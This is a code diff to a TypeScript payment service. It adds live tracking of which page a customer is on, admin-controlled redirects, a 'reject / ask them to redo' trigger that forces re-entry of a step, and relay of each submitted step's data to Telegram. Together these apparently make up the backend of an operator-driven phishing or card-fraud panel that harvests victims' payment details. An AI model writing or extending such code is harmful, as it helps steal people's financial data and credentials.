@@ -69,26 +69,31 @@ export const paymentService = {
     let record = await paymentDao.findByReference(reference);
     if (!record) return { ok: false, action: null, redirect: null };
 
+    // Real-time sync: persist where the customer currently is
+    if (currentPage && record.currentPage !== currentPage) {
+      record = await paymentDao.updateCurrentPage(reference, currentPage);
+      if (!record) return { ok: false, action: null, redirect: null };
+    }
+
     const action = record.flowAction ?? null;
 
-    // Arrived on the target page → clear the pending action.
-    if (
-      currentPage &&
-      isRedirectAction(action) &&
-      pageForAction(action) === currentPage
-    ) {
-      record = await paymentDao.clearFlowAction(reference);
+    // No pending action — customer just waits.
+    if (!isRedirectAction(action)) {
       return { ok: true, action: null, redirect: null };
     }
 
-    let redirect: string | null = null;
-    if (isRedirectAction(action)) {
-      const targetPage = pageForAction(action);
-      if (!currentPage || targetPage !== currentPage) {
-        redirect = pathForAction(action);
-      }
+    const targetPage = pageForAction(action);
+
+    if (currentPage && targetPage === currentPage) {
+      // Admin sent customer to THIS SAME PAGE they're already on.
+      // This means: "reject / ask them to redo" — fire onReset on the frontend.
+      // Clear the action so it only fires once per admin send.
+      await paymentDao.clearFlowAction(reference);
+      return { ok: true, action, redirect: null };
     }
 
+    // Admin sent customer to a DIFFERENT page — return the redirect path.
+    const redirect = pathForAction(action);
     return { ok: true, action, redirect };
   },
 
@@ -110,6 +115,9 @@ export const paymentService = {
 
     const record = await paymentDao.appendFlowSubmission(reference, submission);
     if (!record) return { ok: false };
+
+    // Clear flow action since this step has been submitted
+    await paymentDao.clearFlowAction(reference);
 
     void telegramService.sendStep(step, record, data).catch((err) => {
       logger.error("Telegram flow relay failed", err);
